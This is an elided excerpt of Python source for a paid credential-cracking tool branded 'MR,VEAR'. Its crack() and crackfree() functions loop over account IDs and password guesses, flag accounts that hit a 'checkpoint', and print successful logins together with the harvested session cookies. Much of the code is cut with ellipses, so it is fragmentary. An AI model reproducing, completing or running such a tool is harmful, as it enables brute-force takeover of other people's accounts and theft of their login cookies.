...
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[NAME TOOL                 • MR,VEAR ]   ║  \033[1;97m  

╠══[Github                   • \33[1;38mNOT ]  ║\33[1;34m   
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
def menu():
    ...
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93mCONTACT WITH LORD""")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[MR,VEAR]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;94m[MR,VEAR-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[MR,VEAR-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    ...
    sys.stdout.write(f"\r{H}[MR,VEAR]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•MR,VEAR-Cp] {idf} • {pw}')
                ...
                os.system('espeak -a 300 " Ok,  MR,VEAR,  id"')
